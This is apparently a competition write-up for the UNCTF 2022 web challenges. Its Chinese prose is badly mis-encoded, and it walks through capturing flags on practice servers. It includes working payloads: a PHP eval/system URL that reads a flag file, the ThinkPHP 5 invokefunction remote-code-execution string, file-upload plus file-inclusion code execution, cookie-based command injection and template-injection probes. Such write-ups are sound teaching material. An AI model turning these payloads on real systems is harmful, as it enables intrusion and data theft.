# UNCTF 2022  DoK0wn WP

> UNCTF 2022 å…¬å¼€èµ› 20 å

## Web

### æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦

ç‚¹å‡»é¢˜ç›®å®¹å™¨é“¾æ¥ï¼Œå‘ç°é¦–é¡µæ˜¯ä¸€ä¸ª phpinfo çš„ç•Œé¢ï¼Œ <font color="red"> æˆ‘ä»¬çŸ¥é“åœ¨phpinfo é‡Œé¢èƒ½å­˜æ”¾ä¸€äº›ä¿¡æ¯ã€‚ </font>  å‡ºé¢˜äººå¾ˆæœ‰å¯èƒ½å°† flag æ”¾åœ¨é‡Œé¢.

![](./unctf_web.assets/2022-11-19_13-18.png)

æˆ‘ä»¬å¯ä»¥æŒ‰ <kbd class="keybord"> ctrl </kbd> + <kbd class="keybord"> f </kbd>&ensp; åœ¨ç½‘é¡µä¸Šæœç´¢ç›¸å…³å­—ç¬¦ã€‚

æˆ‘ä»¬åˆçŸ¥é“unctf æ¯”èµ›çš„flag éƒ½æ˜¯ä»¥ `unctf` å¼€å¤´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœç´¢ä¸€ä¸‹ `UNCTF` ç›¸å…³çš„å…³é”®å­—ï¼Œå°è¯•ä¸€ä¸‹åœ¨è¿™ä¸ªé¡µé¢å†…èƒ½å¦æ‰¾åˆ°flagã€‚

å‘ç°æˆåŠŸè·å¾— flag 

![](./unctf_web.assets/2022-11-19_13-19.png)

> èƒ½åœ¨è¿™é‡Œè·å¾—flagæ˜¯æœ‰ç‚¹æ„æ–™ä¹‹å¤–çš„ï¼Œåæ¥æœä¸å…¶ç„¶å‡ºäº†ä¸ªä¿®å¤ç‰ˆ :)


### `ezgame`

æ‰“å¼€é“¾æ¥ï¼Œå‘ç°æœä¸å…¶ç„¶æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œè€Œä»¤æˆ‘æœ‰ç‚¹æ„æ–™ä¹‹å¤–çš„æ˜¯è¿™ä¸ªæ¸¸æˆå¥½åƒæœ‰ç‚¹å¤æ‚ (æ‰€ä»¥æƒ³é€šè¿‡å®Œå…¨é€†å‘å‡ºæ¸¸æˆä»£ç é€»è¾‘,ç„¶åè·å¾—flagçš„æ–¹å¼å¯èƒ½æœ‰ç‚¹éš¾)

![](./unctf_web.assets/2022-11-19_13-19_1.png)

æˆ‘ä»¬å…ˆæŒ‰ <kbd class="keybord"> F12 </kbd>&ensp; æŸ¥çœ‹å…¶è°ƒç”¨äº†å“ªä¸ª JS æ–‡ä»¶ï¼Œå‘ç°è¯¥ç½‘é¡µå°±è°ƒç”¨äº† `main.js` ,é‚£ä¹ˆ `main.js` é‡Œé¢ä¸€å®šæ˜¯æ¸¸æˆé€»è¾‘å’Œæ¸²æŸ“ä»£ç äº†ã€‚

![](./unctf_web.assets/2022-11-19_15-38.png)

CTFä¸­æ¸¸æˆç±»çš„èµ›é¢˜ä¸€èˆ¬éƒ½æ˜¯ä»¥ä¸‹å¥—è·¯
+ å½“æ¸¸æˆå¤±è´¥æ—¶ï¼Œä¼šæ˜¾ç¤ºä½ å¤±è´¥äº†ä¹‹ç±»çš„ä¿¡æ¯
+ <font color="red"> è€Œå½“æ¸¸æˆèƒœåˆ©æ—¶ï¼Œå¤§æ¦‚ç‡ä¼šç»™æˆ‘ä»¬æ˜¾ç¤º flag </font> 

<font color="red"> æ‰€ä»¥æ˜¾ç¤ºflagçš„ä»£ç ä¹Ÿä¸€å®šåœ¨é‡Œé¢ </font> ï¼Œç„¶åæˆ‘å°±æœäº†ä¸€ä¸‹ `unctf`,çœ‹çœ‹ä¼šä¸ä¼šæ˜¯ä»¥ `console.log('unctf{....}')` è¿™ç§æ–¹å¼æ˜¾ç¤º flag,å¦‚æœæ˜¯è¿™ç§æ–¹å¼çš„è¯æˆ‘ä»¬å°±èƒ½ç›´æ¥è·å¾— flag äº†ã€‚

å‘ç°æˆ‘ä»¬ç¡®å®æœç´¢åˆ°äº† unctf è¿™ä¸ªå­—æ ·ï¼Œä½†æ˜¯å¥½åƒå¹¶ä¸æ˜¯ flag

![](./unctf_web.assets/2022-11-19_15-38_1.png)

ä½†å½“æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿ `unctf` é™„è¿‘çš„ä»£ç çš„æ—¶å€™ï¼Œå‘ç°è¿™æ®µä»£ç å¾ˆæœ‰å¯èƒ½å°±æ˜¯è·Ÿæ˜¾ç¤ºflagæœ‰å…³çš„ï¼Œ**åœ¨å‡½æ•°çš„å¼€å¤´æˆ‘ä»¬å¯ä»¥çœ‹è§å®ƒä¼šåˆ¤æ–­æ˜¯å¦æ­»äº¡**ï¼Œå½“æ²¡æ­»äº¡åˆ™æ‰§è¡Œä¸‹é¢è¿™ä¸ªå‡½æ•°ã€‚

![](./unctf_web.assets/2022-11-19_15-42.png)

> è€Œè¿™ä¸ªå‡½æ•°è¢«æ··æ·†ï¼Œå¹¶ä¸”è¿›è¡Œäº†ä¸€å¤§å †æ“ä½œï¼Œé æˆ‘ä»¬é€†å‘è¿™ä¸ªå‡½æ•°çš„éš¾åº¦éå¸¸å¤§ã€‚

ä½†æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªå‡½æ•°å¤åˆ¶ç²˜è´´åˆ°æ§åˆ¶å°å†…ï¼Œçœ‹çœ‹å•ç‹¬è¿è¡Œè¿™ä¸ªå‡½æ•°ä¼šå‘ç”Ÿä»€ä¹ˆã€‚

å½“æˆ‘ä»¬è¿è¡Œå®Œè¿™ä¸ªå‡½æ•°ä¹‹åï¼Œæœä¸å…¶ç„¶æˆ‘ä»¬æˆåŠŸè·å¾—äº† flag

`UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}`

![](./unctf_web.assets/2022-11-19_15-43.png)

### ç­¾åˆ°

æˆ‘ä»¬æ‰“å¼€ç½‘ç«™ä¹‹åï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªè¡¨å•ã€‚

æˆ‘ä»¬å…ˆåˆ«æ€¥ç€è¿›è¡Œ sql æ³¨å…¥,æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼Œçœ‹çœ‹å‡ºé¢˜äººæœ‰æ²¡æœ‰ç»™æˆ‘ä»¬ hint ,æ¯•ç«Ÿæ˜¯ç­¾åˆ°é¢˜ï¼Œéš¾åº¦è‚¯å®šä¸ä¼šå¤ªå¤§ã€‚

å‘ç°äº†ä¸€ä¸ªæ³¨é‡Šï¼Œè€Œè¿™ä¸ªæ³¨é‡Šçœ‹ç€å¾ˆåƒå­¦å·ï¼Œç„¶åæˆ‘å°±å°è¯•ä½¿ç”¨è¿™ä¸ªå½“å­¦å·å’Œå¯†ç è¿›è¡Œç™»å…¥ã€‚

![](./unctf_web.assets/2022-11-19_15-45.png)

å‘ç°å±…ç„¶ç™»å…¥æˆåŠŸäº†,ä½†ä¹Ÿå°±æ˜¯æ˜¾ç¤ºäº†ç™»å…¥æˆåŠŸï¼Œå¹¶æ²¡æœ‰æ˜¾ç¤ºflagã€‚

æˆ‘å°è¯•ä½¿ç”¨æ²¡æœ‰å¯†ç ï¼Œåªä½¿ç”¨å­¦å·,å‘ç°ä¹ŸæˆåŠŸç™»å…¥è¿›å».

**æ ¹æ®å¸¸è¯†ï¼Œå­¦å·ä¸€èˆ¬éƒ½æ˜¯é€’å¢çš„**ï¼Œè€Œåœ¨æŠ¤ç½‘æœŸé—´ï¼Œå½“çº¢é˜Ÿè·å¾—äº†ä¸€ä¸ªå­¦å·ã€å‘˜å·¥å·...ç»å¸¸ä½¿ç”¨çš„å°±æ˜¯éå†è¿™äº›å·ç ä»¥è·å¾—æ›´å¤šçš„ä¿¡æ¯ã€‚

æ‰€ä»¥æˆ‘å°±æƒ³,è¿™è¾¹æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯è€ƒä¿¡æ¯æ³„éœ²è¿™ä¸ªè€ƒç‚¹? 

![](./unctf_web.assets/2022-11-19_15-46.png)

ç„¶åæˆ‘å°±å°è¯•äº†ä¸€ä¸‹ä½¿ç”¨ `20200102` è¿™ä¸ªå­¦å·ç™»å…¥ã€‚

å‘ç°æœåŠ¡ç«¯ç»™æˆ‘ä»¬è¿”å›äº† `f` ,è¯´æ˜æˆ‘ä»¬åªéœ€è¦ä¸€ç›´éå†ä¸‹å»å°±èƒ½è·å¾—flag.

![](./unctf_web.assets/2022-11-19_15-47.png)

æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸‹ä»£ç ç”Ÿæˆæˆ‘ä»¬çš„å­¦å·å­—å…¸ (è¿™è¾¹å…ˆå°è¯• 50 ä½,ä¸€èˆ¬æ¥è¯´flagä¸ä¼šå¤§äº50ä½)

```python
init_num = 20200101

for i in range(50):
    print(init_num + i)
```
ç„¶åè¿è¡Œè¿™æ¡å‘½ä»¤ `python ./dict.py > dict`

æˆ‘ä»¬å…ˆä½¿ç”¨ burpsuite æŠ“å–æˆ‘ä»¬ç™»å…¥çš„æ•°æ®åŒ… 

![](./unctf_web.assets/2022-11-19_16-07.png)

ç„¶åä½¿ç”¨ burpsuite çš„çˆ†ç ´åŠŸèƒ½è¿›è¡Œæš´åŠ›å‘åŒ…ã€‚

![](./unctf_web.assets/2022-11-19_16-07_1.png)

æˆ‘ä»¬å‘ç°å½“å‘åˆ°ç¬¬ 39 ä½åé¢çš„æŠ¥æ–‡é•¿åº¦ä¸º 717 è€Œå‰é¢çš„éƒ½ä¸º 718
æˆ‘ä»¬å°è¯•æŸ¥çœ‹ä¸€ä¸‹ç¬¬ 39 ä½çœ‹çœ‹è¿™ä¸€ä½æ˜¯ä¸æ˜¯å’Œæˆ‘ä»¬é¢„æ–™çš„ä¸€æ ·ä¸º `}`ï¼Œå¦‚æœä¸€æ ·çš„è¯ï¼Œå°±æ›´éªŒè¯äº†æˆ‘ä»¬çš„çŒœæƒ³äº†ã€‚

å‘ç°è¿™ä¸€ä½ç¡®å®æ˜¯ `}` 

![](./unctf_web.assets/2022-11-19_16-09.png)

æ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯å°†è¿™ 39 ä½çš„ flag å†…å®¹æå–å‡ºæ¥è¿›è¡Œæ‹¼æ¥å³å¯ã€‚

æˆ‘ä»¬å¯ä»¥å°†çˆ†ç ´åçš„è¿”å›åŒ…å…¨éƒ¨ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨ shell å‘½ä»¤è¿›è¡Œæ•°æ®å¤„ç†å³å¯

![](./unctf_web.assets/2022-11-19_16-09_01.png)

è¿™è¾¹æˆ‘ç¼–å†™äº†ä¸€å°æ®µ fish è„šæœ¬è¿›è¡Œæ•°æ®å¤„ç†ã€‚

```fish
set -l rep_poor (seq 50)
set -l flag
for i in $rep_poor
	set char_i (cat $i | sed -n '30,30p')  # gain the character
	echo $char_i >> result
end
```
è¿è¡Œä¹‹åæˆåŠŸè·å¾—flag
![](./unctf_web.assets/2022-11-19_16-30.png)


### `babyphp`

æ‰“å¼€é“¾æ¥å‘ç°æ˜¯ä¸€ä¸ª `apache` é»˜è®¤ç•Œé¢,ä¹‹åæˆ‘å°è¯•äº†ä¸€ä¸‹è®¿é—® `index.php` å‘ç°æˆåŠŸæ˜¾ç¤ºäº†ä¸€æ®µ php ä»£ç 

![](./unctf_web.assets/2022-11-20_13-49.png)

> å½“ç„¶è¿™ä¸€æ­¥ä¹Ÿèƒ½é€šè¿‡ç›®å½•æ‰«æå™¨è¿›è¡Œå‘ç° (å¾¡å‰‘ï¼Œdirsearch)

ä¹‹åå°±åˆ°å®¡è®¡ php ä»£ç çš„ç¯èŠ‚äº†ã€‚

![](./unctf_web.assets/2022-11-19_16-33.png)

æˆ‘ä»¬å¯ä»¥æ„å»ºä»¥ä¸‹çš„ payload æ¥ç»•è¿‡ä¸Šé¢çš„æ£€æµ‹ä¸åˆ¤æ–­

```
# a=0&key1=aa3OFF9m&key2=aaK1STfY

http://ff3f2fff-97bb-44f6-96aa-79bbf42827e1.node.yuzhian.com.cn/index.php?code=eval($_GET[1]);&1=system('cat ../../../flag.txt');

```

![](./unctf_web.assets/2022-11-17_23-15.png)

### `easy_upload`

æ‰“å¼€é“¾æ¥æ˜¯ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ç½‘é¡µ

![](./unctf2022.assets/2022-11-20_22-43.png)

æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€äº›æ–‡ä»¶ï¼Œå‘ç°å¤§éƒ¨åˆ†éƒ½è¯´æ ¼å¼é”™è¯¯

![](./unctf2022.assets/2022-11-20_22-44.png)

ä½†å½“æˆ‘ä¸Šä¼ ä¸€å¼ æ¯”è¾ƒå°çš„pngå›¾ç‰‡ï¼Œå‘ç°èƒ½æˆåŠŸä¸Šä¼ ã€‚

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-20_22-46.png)

æ‰€ä»¥æˆ‘ä»¬å°†ä¸Šä¼ pngå›¾ç‰‡çš„åŒ…è¿›è¡ŒæŠ“å–ï¼Œ<font color=red>ç„¶åè¿›è¡Œç¯¡æ”¹,å°†phpè¿œç¨‹æ‰§è¡Œä»£ç å¡«å…¥å…¶ä¸­</font>,çœ‹çœ‹è¿™æ¬¡èƒ½ä¸èƒ½ä¸Šä¼ æˆåŠŸã€‚å‘ç°ä¹Ÿèƒ½ä¸Šä¼ æˆåŠŸã€‚

æˆ‘ä»¬è®¿é—®ä¸€ä¸‹ä¸Šé¢ç»™æˆ‘ä»¬æç¤ºçš„æ–‡ä»¶è·¯å¾„ï¼Œå‘ç°èƒ½æ­£å¸¸æ˜¾ç¤ºå›¾ç‰‡ã€‚

> è¿™æ—¶å€™æˆ‘ä»¬å°†phpä»£ç ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¦‚æœè¿˜å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„æ¼æ´çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½æˆåŠŸæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„è¿œç¨‹å‘½ä»¤ã€‚

åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œ<font color=red>å°±æ˜¯å†å»å¯»æ‰¾ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´</font>ï¼Œç„¶åå°†æˆ‘ä»¬ä¸Šä¼ çš„ php å‘½ä»¤æ–‡ä»¶åŒ…å«è¿›å»ï¼Œå°±èƒ½æˆåŠŸè¿”å›æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚

**æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›®å½•æ‰«æå™¨æ‰«æä¸€ä¸‹è¿™ä¸ªç½‘ç«™ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘ç°æ›´å¤šæœ‰ç”¨çš„ä¿¡æ¯**

<font color=red>æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª `www.rar` æˆ‘ä»¬çŸ¥é“ `www.rar` ä¸€èˆ¬æ˜¯ç½‘ç«™çš„æºç  </font>

![](./unctf2022.assets/2022-11-20_23-01.png)

æˆ‘ä»¬å°è¯•å°†è¿™ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œè§£å‹æˆ‘ä»¬å‘ç°äº† `index.php` çš„æºç 

å‘ç°è¿™ä¸ª `php` æ–‡ä»¶å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´,<font color=red>æˆ‘ä»¬åªéœ€è¦ç»™ä¸ª `file` å‚æ•°ï¼Œå‚æ•°åé¢æ¥è¦åŒ…å«çš„æ–‡ä»¶è·¯å¾„</font>ï¼Œ(æ–‡ä»¶åå¿…é¡»è¦ä¸åŒ…å«`flag` , `..` , `//` è¿™äº›å­—ç¬¦)

![](./unctf2022.assets/2022-11-20_18-14.png)

<div style="border-radius:15px;display:block;background-color:#a8dadc;border:2px solid #aaa;margin:15px;padding:10px;">
ä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œå°±æ˜¯flagå¹¶ä¸åœ¨æ ¹ç›®å½•ï¼Œä¹Ÿä¸åœ¨ç½‘ç«™æ ¹ç›®å½•ï¼Œè€Œåœ¨å®¶ç›®å½•
</div>

å¦‚æœå®åœ¨æ‰¾ä¸åˆ° flag ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ¥æŸ¥æ‰¾flagæ‰€åœ¨ä½ç½®

![](./unctf_web.assets/2022-11-17_20-16.png)

ä¹Ÿå¯ä»¥å‘ç° flag åœ¨ /home/ctf/flag

![](./unctf_web.assets/2022-11-17_20-14.png)

ç„¶åæˆ‘ä»¬å°±èƒ½å…ˆå°†æˆ‘ä»¬è¦åˆ©ç”¨çš„phpä»£ç ä¸Šä¼ ä¸Šå»ï¼Œå¦‚ä¸‹

![](./unctf_web.assets/2022-11-17_20-14_1.png)

ç„¶åè®¿é—®ç½‘ç«™ä¸»é¡µä¼ ä¸Š `?file=uplO4d/res.png` è¿™ä¸ªè·¯å¾„ä¸ºä¸Šä¼ åˆ°æœåŠ¡å™¨åçš„è·¯å¾„

![](./unctf_web.assets/2022-11-17_20-13.png)

### ç»™ä½ ä¸€åˆ€

æ‰“å¼€é“¾æ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ª ThinkPHP çš„ç•Œé¢,è¯´æ˜è¿™ä¸ªç½‘ç«™æ˜¯ç”± ThinkPHP è¿™ä¸ªæ¡†æ¶æ­å»ºçš„ã€‚

æˆ‘ä»¬çŸ¥é“ `ThinkPHP_V5` å­˜åœ¨è¿œç¨‹ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´,æˆ‘ä»¬å¯ä»¥å»ç½‘ä¸ŠæŸ¥æ‰¾ä¸€ä¸‹ ThinkPHP æ¡†æ¶çš„ poc



![](./unctf_web.assets/2022-11-19_16-40.png)

ç„¶åæˆ‘ä»¬æŸ¥æ‰¾äº†æœåŠ¡å™¨ä¸Šæ‰€æœ‰å¸¦ flag å­—æ ·çš„æ–‡ä»¶ï¼Œå‘ç°å¹¶æ²¡æœ‰æŸ¥æ‰¾åˆ°ç›¸å…³æ–‡ä»¶ã€‚

è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¦æƒ³åˆ°ï¼Œflag å¯èƒ½è—åœ¨ phpinfo é‡Œé¢


```
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

è¿è¡Œä¸Šé¢çš„åˆ©ç”¨ä»£ç ï¼ŒæˆåŠŸåœ¨ phpinfo é‡Œé¢æ‰¾åˆ°flag

![](./unctf2022.assets/2022-11-19_16-44.png)



### æˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦(ä¿®å¤ç‰ˆ)

é¢˜ç›®æè¿°è¯´å­˜åœ¨ä¸¤ä¸ª Hint æ‰€ä»¥æˆ‘åœ¨é¦–é¡µçš„phpinfo é‡Œé¢æŸ¥æ‰¾äº† hint ç›¸å…³çš„å­—æ ·ï¼Œå‘ç°æˆåŠŸè·å¾—ä¸€ä¸ª Hint

![](./unctf_web.assets/2022-11-19_16-46.png)

å®ƒæ˜¯ä¸€æ®µ base64 ,æˆ‘ä»¬å¯¹å…¶è¿›è¡Œè§£ç ï¼Œä¹‹åå‘ç°äº†ä¸€ä¸ª `admin_unctf.php`,è¿™ä¸ªä¸€çœ‹å°±æ˜¯ä¸€ä¸ªè·¯å¾„

![](./unctf_web.assets/2022-11-19_16-47.png)

æ‰€ä»¥æˆ‘ä»¬è®¿é—®è¯¥è·¯å¾„ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å…¥è¡¨å•ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹å…¶æºç ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è·å¾—ç¬¬äºŒä¸ª Hint

å‘ç°å®ƒå«æˆ‘ä»¬æŠ“ä¸ªåŒ…ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œé‚£æˆ‘ä»¬å°±æŠ“ä¸ªåŒ…çœ‹çœ‹ã€‚

![](./unctf_web.assets/2022-11-19_16-48.png)

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·é‡Œé¢çš„ `NetWork` æ¨¡å—ï¼Œé‡Œé¢èƒ½æŸ¥çœ‹å“åº”åŒ…å’Œè¯·æ±‚åŒ…å’Œå¤´éƒ¨ä¿¡æ¯ã€‚

**æˆ‘ä»¬åœ¨å“åº”åŒ…å†…çš„å¤´éƒ¨æˆåŠŸæ‰¾åˆ° Hint2**

![](./unctf_web.assets/2022-11-19_16-52.png)

å‘ç°è¿˜æ˜¯ base64 å¯¹å…¶è§£ç ä¹‹åï¼Œè·å¾—è¡¨å•çš„ç™»å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚

![](./unctf_web.assets/2022-11-19_16-53.png)

ç™»å…¥ä¹‹åå‘ç°æ˜¯ä¸€æ®µ php ä»£ç 

![](./unctf_web.assets/2022-11-19_16-54.png)

å®¡è®¡ä»£ç ä¹‹åï¼Œå‘ç°æˆ‘ä»¬åªéœ€è¦ä¼ å…¥ä¸€ä¸ª `Cookie` å¹¶ä¸”åœ¨ `Cookie` å‚æ•° `cmd` é‡Œè®¾ç½®æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼Œ(ä¼ å…¥çš„å‘½ä»¤è¦å°† `ping` å‘½ä»¤æˆªæ–­)ï¼Œå°±èƒ½è¿œç¨‹æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤äº†ã€‚

> è¿™è¾¹éœ€è¦æ³¨æ„çš„æ˜¯ `;` åœ¨è¿™ä¸ªé¢˜ç›®å†…æ²¡ç”¨ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œè¿™è¾¹çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ `|` å·

æ„é€ ä¸‹é¢çš„åŒ…ï¼Œç„¶åè¿›è¡Œå‘é€ï¼Œå‘ç°æœåŠ¡ç«¯æˆåŠŸç»™æˆ‘ä»¬è¿”å›äº†ä¸€æ®µ base64

![](./unctf_web.assets/2022-11-19_16-59.png)

æˆ‘å¯¹å…¶è¿›è¡Œè§£ç ä¹‹åå‘ç°æ˜¯ä¸€ä¸ª URL ï¼Œ

![](./unctf_web.assets/2022-11-19_16-59_1.png)

æˆ‘ä»¬è®¿é—®è¿™ä¸ª URL æˆåŠŸè·å¾—flag

![](./unctf_web.assets/2022-11-19_17-00.png)


```
unctf{this_is_so_easy}
```


### 302ä¸æ·±å¤§

é¢˜ç›®ä¸º 302 å¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€åˆ° 302 è·³è½¬çš„é¢˜ç›®,æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹è¿™ä¸ªç½‘ç«™ï¼Œåœ¨è¿™ä¸ªç½‘ç«™ä¸Šå¹¶æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚åœ¨æ ¹æ®é¢˜ç›®æè¿°ï¼š<font color=red>è¿™ä¸ªé¡µé¢ä¸æ˜¯ä¸»é¡µ</font>

![](./unctf2022.assets/2022-11-20_23-38.png)

æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨ `wget/curl` å°†æœ€å¼€å§‹çš„ç•Œé¢ç»™ä¸‹è½½ä¸‹æ¥

![](./unctf2022.assets/2022-11-21_16-30.png)

å‘ç°å®ƒå«æˆ‘ä»¬ä½¿ç”¨<font color=red> GET æ–¹å¼ä¼ ä¸€ä¸ª `miku=puppy` POST ä¼ ä¸€ä¸ª `micgo=ikun`</font>

é‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ burpsuit æŠ“åŒ…ç„¶åå°†å‚æ•°å¡«å…¥å…¶ä¸­å³å¯, <font color=red>æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡ `hackbar` å‘åŒ…ï¼Œå› ä¸ºå‘å®ŒåŒ…ï¼Œæˆ‘ä»¬çœ‹ä¸åˆ°è¿”å›ç»“æœï¼Œå°±ä¼šè¢«è·³è½¬åˆ° `saves.html` è¿™ä¸ªç•Œé¢</font>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¥è·å¾—è¿”å›ç»“æœã€‚

+ å…ˆä½¿ç”¨ `hackbar` æ„é€ å¥½å‚æ•°
+ æ‰“å¼€ `burpsuite` å¹¶è®¾ç½®å¥½ä»£ç†ï¼Œè¿›è¡ŒæŠ“åŒ…
+ åœ¨ `hackbar` å†…ç‚¹å‡» `Execute` è¿›è¡Œå‘åŒ…ï¼Œç„¶ååœ¨ `burpsuite` è¿™é‡Œæˆ‘ä»¬å°†æŠ“åˆ°æˆ‘ä»¬å°†è¦å‘é€çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°†å…¶å‘é€åˆ° `burpsuite` çš„ `Repeater` æ¨¡å—å†…
+ ç„¶ååœ¨ `burpsuite` å†…çš„é‡æ”¾æ¨¡å—è¿›è¡Œå‘åŒ…ï¼Œè¿™æ—¶å€™å°†ä¸ä¼šè·³è½¬ã€‚

![](./unctf2022.assets/2022-11-21_16-40.png)

å‘ç°å®ƒè¯´æˆ‘ä»¬å·²ç»è®¤è¯†äº†è¯·æ±‚æ–¹å¼ï¼Œè¯´æ˜æˆ‘ä»¬åˆšåˆšåšçš„æ­¥éª¤æ²¡æœ‰é”™ï¼Œç„¶ååˆè¿”å›äº†ä¸€ä¸ªåªæœ‰ admin æ‰èƒ½çœ‹åˆ° flagï¼ŒCookie çš„å‚æ•°æ˜¯ adminã€‚è€Œä¸”ä¸Šä¸€å¥è¯å°±æ˜¯è®¤è¯† Cookie æ¬ºéª—ï¼Œè®¤è¯ï¼Œä¼ªé€ ã€‚

**å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ª `Cookie` è®©ç½‘ç«™è®¤ä¸ºæˆ‘ä»¬æ˜¯ `admin`**

æˆ‘ä»¬çŸ¥é“è®¾ç½® `Cookie` çš„æ–¹å¼å°±æ˜¯åœ¨è¯·æ±‚å¤´ä¸Šæ·»åŠ ä¸€è¡Œ `Cookie: key=value` è¿™ç§å½¢å¼çš„å†…å®¹ã€‚

> ä¸€å¼€å§‹æˆ‘å°è¯•äº†å¾ˆå¤šæ–¹å¼ `Cookie: user=admin/Cookie: admin=1...` <font color=red>åé¢å‘ç°æ˜¯ `Cookie: admin=true`</font>

![](./unctf_web.assets/2022-11-18_00-07_1.png)

å½“æˆ‘ä»¬æŠŠæ‰€æœ‰çš„å‚æ•°å’Œä¼ªé€ ä¿¡æ¯éƒ½å¼„å·ä¹‹åï¼Œå‘ç°æœåŠ¡å™¨ç»™æˆ‘ä»¬è¿”å›äº†å¾ˆé•¿çš„å“åº”å†…å®¹ï¼Œæˆ‘ä»¬å°†å…¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨å°†å…¶æ‰“å¼€ä¹‹åï¼Œå‘ç°æ˜¯ä¸€ä¸ª phpinfo çš„ç•Œé¢ï¼Œæˆ‘ä»¬åœ¨ç½‘é¡µä¸Šæœç´¢ `unctf` æˆåŠŸè·å¾— `flag`

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-18_00-07.png)

### `easy_ssti`

é¢˜ç›®æè¿°è¯´ php çœ‹ç´¯äº†ï¼Œé‚£å°±çœ‹çœ‹ python ä»£ç å§ï¼Œè¯´æ˜è¿™ä¸ªé¢˜ç›®æ˜¯è€ƒ python çš„æ¨¡æ¿æ³¨å…¥

æˆ‘ä»¬çŸ¥é“ flask ç­‰pythonæ¡†æ¶ä½¿ç”¨çš„æ˜¯ `{{}}` è¿™ä¸ªæ¨¡æ¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•åœ¨è¡¨å•ä¸Šæäº¤è¿™ä¸ªæ¨¡æ¿ï¼Œçœ‹çœ‹ä¼šä¸ä¼šæŠ¥é”™ï¼Œæˆ–è€…ç»™æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤.

æˆ‘å°è¯•äº†ä»¥ä¸‹æ–¹å¼ï¼Œ`secho{{3+3}}`

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_17-05.png)

å‘ç°å¥½åƒçœŸçš„ç»™æˆ‘ä»¬æ‰§è¡Œäº† `3+3` è¿™ä¸ªè¯­å¥ï¼Œå¹¶æˆåŠŸç»™æˆ‘ä»¬è¿”å›äº† 6

![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_17-05_1.png)

ç„¶åæˆ‘å°±å°è¯•äº†ä¸€ä¸‹è¿™ä¸ªå‘½ä»¤ `secho{{"".__class__}}`ï¼Œçœ‹çœ‹æˆ‘ä»¬èƒ½ä¸èƒ½ä½¿ç”¨ `__Class__` æ¥æ„é€ ä»»æ„çš„å‘½ä»¤



![](/home/zh/GitHub/blog-article/CTF/writeup/unctf2022.assets/2022-11-21_17-06.png)

